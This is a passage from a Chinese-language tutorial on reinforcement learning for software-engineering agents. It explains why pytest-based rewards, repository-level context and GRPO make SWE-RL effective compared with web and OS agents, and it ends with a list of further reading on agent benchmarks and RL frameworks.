2. **Rule-based pytest reward 比 LLM-as-judge 更可靠**：pytest 通过 = binary、deterministic、几乎不可 hack——这种 clean signal 让 RL 真的稳定收敛
3. **Repository-level context**：不是单 file diff，而是把整个 repo 上下文喂给 policy（参考 14 章 multi-file edit 范式），更接近真实工程
4. **GRPO + group-relative advantage**：去 critic（参考 9.5），避免 4-model 显存灾难，让 70B 模型 RL 可行
5. **结果**：SWE-bench Verified 上 +5-10 个点 vs SFT-only baseline，证明 RL 在 code agent 上的边际增量

**为什么真实 env RL 是 SWE agent 关键**：

1. **Reward signal 的 grounding**：pytest 是真正的 ground truth，比"代码看起来对"或"LLM judge 觉得对"准确得多。Web/OS agent 的 reward 都是 proxy，code agent 是少数有 native 真实 reward 的领域
2. **SFT 天花板低**：Mind2Web 风格的 SFT 数据告诉模型"应该这样改"，但真实工程是 探索 + 试错。RL 让 agent 学会"先 grep → 看 test → 改 → 再跑 test → 修补"这种迭代行为
3. **Distribution match**：训练 distribution 与部署 distribution 一致——agent 直接在真实 GitHub repo 上学，部署到 Devin / Claude Code 上没 sim-to-real gap
4. **可扩展 reward**：每天新 issue + PR 自动产生新训练 task，rule reward 自动产生不需要人标——这是 RL pipeline 的 sustainability 关键

**反思**：为什么 web/OS agent 的 RL 进展不如 SWE agent？
- web/OS reward 难定义、易 hack
- web/OS observation 多模态、序列化复杂
- web/OS env 部署 cost 高（VM > container）
- 而 SWE 的 pytest 是天选 reward signal

加分：能指出真实 env RL + reasoning + agent 的三者结合是 2025-2026 趋势（Search-R1 / ReSearch / Agent-R1，详见 15.4），SWE-RL 是这一方向第一个工业 milestone

</details>

---

## 10. 延伸阅读

- [WebArena 官网与 leaderboard](https://webarena.dev/) — 最新 SOTA 数字、可下载 docker compose 环境
- [SWE-bench Verified leaderboard](https://www.swebench.com/) — Claude Code / Devin / SWE-agent 对比，看真实 SWE agent 谁强
- [OSWorld GitHub](https://github.com/xlang-ai/OSWorld) — VM setup + task evaluator 实现
- [SWE-Gym GitHub](https://github.com/SWE-Gym/SWE-Gym) — Pan 2024 的训练 env，能直接拿来跑 GRPO
- [Anthropic Computer Use blog](https://www.anthropic.com/news/3-5-models-and-computer-use) — 工业 GUI agent 视角
- [WebGPT paper](https://arxiv.org/abs/2112.09332) — 真实 env RL 的鼻祖，必读理解 action space 起源
- [Mind2Web GitHub](https://github.com/OSU-NLP-Group/Mind2Web) — 跨 site web action 数据集，SFT 冷启主力
- [verl 框架](https://github.com/volcengine/verl) — 字节跳动开源 RLHF 框架，对 multi-turn / real-env agent RL 友好，是真实 env RL 工程实现的好起点
- 推荐继续读本教程的 **15.4 节《Reasoning + Agent：Search-R1 / ReSearch / ReTool / Agent-R1》**——本节关注真实 env 的"环境与 reward"，15.4 关注怎么把 reasoning 与真实 env tool use 结合训练；以及 **15.5 节《Agent 鲁棒性》**——讲在真实 env 中 observation perturbation / tool failure / recovery 的训练
